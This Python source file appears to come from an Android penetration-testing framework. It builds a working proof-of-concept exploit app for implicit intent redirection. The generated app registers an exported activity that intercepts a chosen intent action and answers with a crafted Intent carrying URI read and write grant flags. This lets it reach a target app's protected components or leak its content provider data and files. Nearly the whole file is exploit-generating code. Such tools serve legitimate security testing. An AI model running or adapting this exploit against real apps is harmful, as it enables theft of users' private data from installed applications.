from modules.android.app.app import App
from modules.android.app.template import Template
from settings.logger import get_logger
from state.opt_bool import OptBool
from state.opt_enum import OptEnum
from state.opt_list import OptList
from state.opt_str import OptStr
from state.options import option_state


log = get_logger(__name__)


class SherlockModule(App):

    def __init__(self):
        super().__init__()
        self._id = "intent_redirection_implicit"
        self._template = Template()


    def register_options(self):
        option_state.add_options([
            OptBool("IS_EXPORTED", [True, "Whether the target class is exported (Default: False)", False]),
            OptBool("VIA_DEEPLINK", [False, "Communicate to target via deeplink (Default: False)", False]),
            OptBool("LEAK_PROVIDER", [True, "Leak content provider (Default: False)", False]),
            OptStr("DEEPLINK_URI", [False, "Deeplink URI to launch target activity"]),
            OptStr("TARGET_PACKAGE", [True, "Target package name"]),
            OptStr("TARGET_CLASS", [False, "Target class name"]),
            OptStr("PARCEL_EXTRA", [True, "Parcel extra key"]),
            OptStr("PROVIDER_URI", [False, "Content provider URI to access"]),
            OptStr("BUNDLE_EXTRA", [False, "Bundle extra key"]),
            OptStr("BUNDLE_PARCEL", [False, "Parcel bundle key"]),
            OptStr("COMPONENT_CLASS", [True, "Protected component class name"]),
            OptStr("INTENT_ACTION", [True, "Action name to intercept"]),
            OptList("PUT_EXTRA", [False, "Intent extra data"]),
            OptList("COMPONENT_EXTRA", [False, "Protected component intent extra data"]),
            OptList("IPUT_EXTRA", [False, "Intercept intent extra data"]),
            OptEnum("PROVIDER_TYPE", [False, "Content provider type (1: Share content, 2: Access to files)", "", [1, 2]]),
            OptEnum("RESULT_CODE", [True, "Result code returned to the caller (Default: -1)", -1, [-1, 0, 1, "RESULT_OK", "RESULT_FIRST_USER", "RESULT_CANCELED"]])
        ])
        self.update_option_status()


    def update_option_status(self):
        opts = option_state.get_all_options()
        stat_dict = {
            "leak_provider": {
                "pos": ["provider_type", "provider_uri"],
                "neg": ["component_class"]
            },
            "via_deeplink": {
                "pos": ["deeplink_uri"],
                "neg": []
            },
            "is_exported": {
                "pos": ["via_deeplink", "target_class"],
                "neg": []
            }
        }
        super().update_option_status(stat_dict, opts)


    def execute(self):
        opts = self.get_options_value()

        is_exported = opts['IS_EXPORTED']
        via_deeplink = opts['VIA_DEEPLINK']
        leak_provider = opts['LEAK_PROVIDER']
        deeplink_uri = opts['DEEPLINK_URI']
        target_package = opts['TARGET_PACKAGE']
        target_class = opts['TARGET_CLASS']
        intent_action = opts['INTENT_ACTION']
        protected_component_class = opts['COMPONENT_CLASS']
        bundle_extra = opts['BUNDLE_EXTRA']
        bundle_parcel = opts['BUNDLE_PARCEL']
        parcel_extra = opts['PARCEL_EXTRA']
        provider_uri = opts['PROVIDER_URI']
        put_extra = opts['PUT_EXTRA']
        intercept_put_extras = opts['IPUT_EXTRA']
        protected_component_extra = opts['COMPONENT_EXTRA']
        provider_type = opts['PROVIDER_TYPE']
        result_code = opts['RESULT_CODE']

        manifest = [
            self._template.build_manifest_component(
                self.activity_name(self._id, target_package)
            ),
            self._template.build_manifest_component(
                self.intercept_activity_name(self._id, target_package), 
                is_exported=True,
                intercept=True, 
                action=intent_action
            ),
            self._template.build_manifest_component(
                self.leak_provider_activity_name(self._id, target_package), 
                is_exported=True
            )
        ]

        extras = list()
        if intercept_put_extras != "":
            for extra in intercept_put_extras:
                extras.append([extra[0], f'"{extra[1]}"'])
        if parcel_extra != "":
            extras.append([parcel_extra, "target"])
        if bundle_extra != "":
            extras.append([bundle_extra, "bundle"])

        intercept_activity = self._template.build_activity(
            name=self.intercept_activity_name(self._id, target_package),
            libs=[
                "android.content.Intent",
                "android.net.Uri",
                "android.os.Bundle",
                "androidx.appcompat.app.AppCompatActivity"
            ],
            on_create=[
                self._template.build_intent(
                    intent_var="target",
                    set_data=f'"{provider_uri}"' if leak_provider else None,
                    put_extra=[[extra[0], f'"{extra[1]}"'] for extra in protected_component_extra] if protected_component_extra != "" else [],
                    set_classname=[self._package, f"{self._package}.{self.leak_provider_activity_name(self._id, target_package)}"] if leak_provider else [target_package, protected_component_class],
                    set_flags=["Intent.FLAG_GRANT_READ_URI_PERMISSION", "Intent.FLAG_GRANT_WRITE_URI_PERMISSION"] if leak_provider else [],
                    start_activity=False
                ),
                f'Bundle bundle = new Bundle();\nbundle.putParcelable("{bundle_parcel}", target);' if bundle_parcel != "" else "",
                self._template.build_intent(
                    put_extra=extras,
                    start_activity=False,
                    set_result=True,
                    result_code=result_code
                )
            ],
            finish=True
        )

        exploit_activity = self._template.build_activity(
            name=self.activity_name(self._id, target_package),
            libs=[
                "android.content.Context",
                "android.content.Intent",
                "android.net.Uri",
                "android.os.Bundle",
                "androidx.appcompat.app.AppCompatActivity"
            ],
            bind_button=True,
            on_create=[self._template.build_intent(
                set_action="android.intent.action.VIEW" if via_deeplink else None,
                set_data=f'"{deeplink_uri}"' if via_deeplink else None,
                put_extra=[[extra[0], f'"{extra[1]}"'] for extra in put_extra] if put_extra != "" else [],
                set_classname=[target_package, target_class] if not via_deeplink else []
            )]
        )

        leak_provider_activity = self._template.build_activity(
            name=self.leak_provider_activity_name(self._id, target_package),
            libs=[
                "android.content.Context",
                "android.content.Intent",
                "android.database.Cursor",
                "android.net.Uri",
                "android.os.Bundle",
                "android.util.Base64",
                "android.util.Log",
                "androidx.activity.result.ActivityResultLauncher",
                "androidx.activity.result.contract.ActivityResultContracts",
                "androidx.appcompat.app.AppCompatActivity",
                "java.io.BufferedReader",
                "java.io.FileNotFoundException",
                "java.io.IOException",
                "java.io.InputStream",
                "java.io.InputStreamReader",
                "java.nio.charset.StandardCharsets"
            ],
            on_create=[
                "Uri uri = Uri.parse(getIntent().getDataString());",
                self._template.resolve_content(provider_type)
            ]
        )

        component = [
            {
                "name": f"{self.activity_name(self._id, target_package)}.java",
                "content": exploit_activity
            },
            {
                "name": f"{self.intercept_activity_name(self._id, target_package)}.java",
                "content": intercept_activity
            },
            {
                "name": f"{self.leak_provider_activity_name(self._id, target_package)}.java",
                "content": leak_provider_activity
            }
        ]

        if not leak_provider:
            manifest.pop()
            component.pop()
        if not is_exported:
            manifest.pop(0)
            component.pop(0)

        app = {
            "manifest": manifest,
            "layout": self._template.button_layout(self._id, target_package) if is_exported else None,
            "bind_button": self._template.bind_button(self._id, target_package) if is_exported else None,
            "component": component
        }

        build_app = self.build(app)
        if not build_app:
            log.error("Process failed, terminating module.")
            return
        
        self.check_component_log(opts)

        self.check_logcat()